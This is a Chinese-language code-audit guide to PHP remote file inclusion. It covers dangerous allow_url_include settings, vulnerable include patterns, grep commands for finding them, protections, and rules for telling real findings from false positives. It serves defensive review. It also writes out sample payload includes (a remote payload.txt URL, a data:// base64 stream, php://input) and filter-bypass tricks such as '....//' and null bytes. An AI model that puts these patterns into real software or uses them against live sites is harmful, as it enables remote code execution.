# PHP Remote File Inclusion Enabled

## Details

### 代码示例

**php.ini 配置**
```ini
allow_url_fopen = On
allow_url_include = On  ; 危险配置，允许远程文件包含
```

**.htaccess 配置**
```apache
php_flag allow_url_include On
php_value allow_url_include 1
```

**运行时动态设置**
```php
ini_set('allow_url_include', '1');
ini_set('allow_url_fopen', '1');
```

**典型危险用法**
```php
// 直接包含用户可控变量
include($_GET['page'] . '.php');
require($module . '/config.php');

// URL 包含
include('http://external.com/payload.txt');
include('data://text/plain;base64,PD9waHAgc...');
include('php://input');
```

### 快速定位核心操作技巧

**（L1：关键词扫描）**
- `grep -r "allow_url_include" .` - 扫描配置文件
- `grep -r "ini_set.*allow_url" *.php` - 查找动态设置
- `phpinfo()` 输出中检查 `allow_url_include` 状态

**（L2：跳读）**
- 检查 `php.ini`、`.htaccess`、`.user.ini` 中 allow_url 相关配置
- 搜索 `include`、`require`、`include_once`、`require_once` 语句
- 关注参数来源：`$_GET`、`$_POST`、`$_REQUEST`、`$_COOKIE`

**（L3：逐行读）**
- 追踪 include/require 的变量赋值链
- 检查是否存在路径拼接操作（`.php` 后缀拼接、目录拼接）
- 确认变量是否经过白名单/黑名单过滤

**（L4：跨模块追踪）**
- 追踪配置加载流程（bootstrap → config loader → runtime）
- 检查框架路由机制中的文件包含逻辑
- 分析模板引擎、插件系统的动态加载机制

### 快速定位保护机制技巧

**（L1：关键词扫描）**
- `allow_url_include = Off` - 配置层面禁用
- `open_basedir` - 限制文件访问范围
- `basename()`、`realpath()` - 路径规范化函数

**（L2：跳读）**
- 检查是否存在白名单数组验证：`in_array($module, $allowed_modules)`
- 查找路径过滤函数：`str_replace('../', '', $path)`
- 确认是否使用 `stream_wrapper_unregister()` 禁用危险协议

**（L3：逐行读）**
- 验证白名单完整性（是否覆盖所有分支）
- 检查过滤绕过可能（`....//`、URL 编码、Null 字节）
- 确认 `open_basedir` 配置是否生效且正确

**（L4：跨模块追踪）**
- 分析全局安全中间件/过滤器的执行时机
- 检查 WAF/IDS 规则对 RFI 的检测能力
- 追踪权限验证与文件包含的时序关系

## Classify

### 漏洞
- `allow_url_include=On` 且存在用户可控的 include/require 参数
- 即使有部分过滤，但可通过编码、协议变换等方式绕过
- 配置文件可被 Web 用户修改（权限问题导致）

### 误报
- `allow_url_include=On` 但所有文件包含路径均为硬编码常量
- 用户输入经过严格白名单验证（白名单固定且无法绕过）
- `open_basedir` 限制严格，且包含路径不在可控范围内
- 仅在 CLI 模式下使用，Web 环境已禁用

### 代码异味
- 配置启用但实际业务无远程包含需求（配置冗余）
- 使用黑名单过滤而非白名单（存在绕过风险）
- 依赖路径拼接 `.php` 后缀作为唯一防护（可通过 Null 字节等绕过）
- 未集中管理配置，存在多个配置源（运维风险）

## Low risk

### 适用场景
- 内网隔离环境，攻击者无法提供恶意远程文件源
- 包含路径来自数据库/配置文件等可信数据源，且写入过程有严格权限控制
- 仅用于加载已知的、经过数字签名验证的远程模块
- 配合 `stream_wrapper_unregister('http')` 等禁用危险协议，仅保留必要协议

### 降级条件
- 应用处于开发/测试阶段，未对外暴露
- 受影响功能需高权限用户才能访问（如管理员后台）
- 已部署 WAF 且明确拦截 RFI 攻击特征（需持续验证有效性）
- 系统文件权限严格，无法写入可执行代码到可访问目录